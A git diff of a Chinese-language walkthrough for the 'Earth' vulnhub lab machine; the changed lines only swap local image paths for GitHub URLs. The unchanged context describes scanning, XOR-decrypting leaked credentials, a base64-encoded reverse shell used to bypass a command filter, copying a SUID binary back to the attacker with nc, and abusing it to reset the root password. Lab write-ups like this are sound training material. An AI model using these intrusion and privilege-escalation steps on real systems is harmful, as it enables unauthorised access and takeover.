@@ -31,7 +31,7 @@
     >
     > 参数说明: -i 指定网卡进行监听
     >
-    > ![image-20220414204745265](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414204745265.png)
+    > ![image-20220414204745265](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414204745265.png)
 
   * 访问ssh,80以及443端口后均无果
 
@@ -39,7 +39,7 @@
 
   * > sudo echo "172.16.148.128 earth.local terratest.earth.local" >> /etc/hosts 
     >
-    > ![image-20220414205505143](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414205505143.png)
+    > ![image-20220414205505143](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414205505143.png)
 
   * 尝试输入一些内容,此时得到的结果都是经过加密的,没有相应算法无法进行解密
 
@@ -49,11 +49,11 @@
 
     > dirsearch -u earth.local
     >
-    > ![image-20220414205805150](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414205805150.png)
+    > ![image-20220414205805150](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414205805150.png)
 
   * 尝试访问
 
-  * ![image-20220414210005120](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414210005120.png)
+  * ![image-20220414210005120](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414210005120.png)
 
   * 继续扫描当前网站,查看是否有其他的未知文件或目录
 
@@ -69,17 +69,17 @@
     >
     > -w 指定字典或字符串位置
     >
-    > ![image-20220414212315022](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414212315022.png)
+    > ![image-20220414212315022](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414212315022.png)
     >
     > 不能说是一无所获,只能说是毛都没有
 
   * 扫描https网址: > https://terratest.earth.local 此处如果未加https则会重定向到earth.local
 
-  * ![image-20220414212931593](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414212931593.png)
+  * ![image-20220414212931593](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414212931593.png)
 
   * 发现robots.txt文件,打开看看...
 
-  * ![image-20220414213459622](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414213459622.png)
+  * ![image-20220414213459622](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414213459622.png)
 
   * 此处有一项内容不允许抓取,连续测试文件后缀名,排除已在列表之上的所有扩展名.(直接试txt)
 
@@ -91,21 +91,21 @@
     >
     > -k 允许连接到 SSL 站点，而不使用证书
     >
-    > ![image-20220414214153186](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414214153186.png)
+    > ![image-20220414214153186](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414214153186.png)
 
   * 书接上文,此时已经看到当前的加密方式为XOR,且已经得到了用户名,密钥的解密方式可能会存在于`testdata.txt`中尝试将页面中的字符串进行解密
 
-  * ![image-20220414215438804](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414215438804.png)
+  * ![image-20220414215438804](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414215438804.png)
 
 * 使用cyberchef将数据进行解密,首先需要将字符串转换为16进制,在进行xor解密
 
-  * ![image-20220414221146463](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414221146463.png)
+  * ![image-20220414221146463](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414221146463.png)
   * 尝试登陆:
-  * ![image-20220414221322145](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220414221322145.png)
+  * ![image-20220414221322145](https://raw.githubusercontent.com/christopher-x/images/main/image-20220414221322145.png)
   * 使用shell进行连接----被禁止远程连接. 
-  * ![image-20220415112323869](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415112323869.png)
+  * ![image-20220415112323869](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415112323869.png)
   * 此时我们可以通过将反弹shell进行编码来进行绕过,此处使用base64编码,当然使用其他编码也是可以的.
-  * ![image-20220415113450920](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415113450920.png)
+  * ![image-20220415113450920](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415113450920.png)
   * 将已准备好的命令进行base64编码后重定向到bash,使用`-e`参数来指定重定向的shell
 
 * 权限提升
@@ -118,22 +118,22 @@
       -perm -mode    文件的权限包括mode就匹配（该文件还可以拥有额外的权限属性）
     * -u=s  当前用户可执行的suid的脚本或文件
     * 2为过滤输出,只输出正确的内容,过滤掉错误的信息.
-  * ![image-20220415125602811](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415125602811.png)
+  * ![image-20220415125602811](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415125602811.png)
   * 看到一个重置root的文件,执行一下看看
-  * ![image-20220415125937905](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415125937905.png)
+  * ![image-20220415125937905](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415125937905.png)
   * 执行失败,将文件下载之后查看内容 `再启一个端口将文件传回`
   * `nc -nvlp 8889 > reset_root` 服务器端监听8889端口并将接受到的文件重命名为reset_root
   * `nv -nc 8889 < /usr/bin/reset_root` 将客户端的文件传回服务器端
-  * ![image-20220415130433781](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415130433781.png)
+  * ![image-20220415130433781](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415130433781.png)
   * 在服务器端查看该文件 `使用strings` 来查看该二进制文件
-  * ![image-20220415131622450](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415131622450.png)
+  * ![image-20220415131622450](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415131622450.png)
   * 无法得出有效信息,尝试使用工具进行跟踪代码
   * `ltrace ./reset_root` 使用该命令之前需要将代码修改为可执行状态`chmox +x reset_root`
-  * ![image-20220415131909783](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415131909783.png)
+  * ![image-20220415131909783](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415131909783.png)
   * 执行到此处后提示缺少文件,根据提示在客户端创建三个文件
   * 再次执行`/usr/bin/reset_root`文件
-  * ![image-20220415132511034](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415132511034.png)
+  * ![image-20220415132511034](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415132511034.png)
   * 根据提示运行成功,并将root密码成功重置为`Earth`
-  * ![image-20220415132949855](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415132949855.png)
+  * ![image-20220415132949855](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415132949855.png)
   * 以已成功获取到root权限
-  * ![image-20220415133120328](/Users/christopher/Documents/GitHub/nwst/earth-vulhub.assets/image-20220415133120328.png)
+  * ![image-20220415133120328](https://raw.githubusercontent.com/christopher-x/images/main/image-20220415133120328.png)
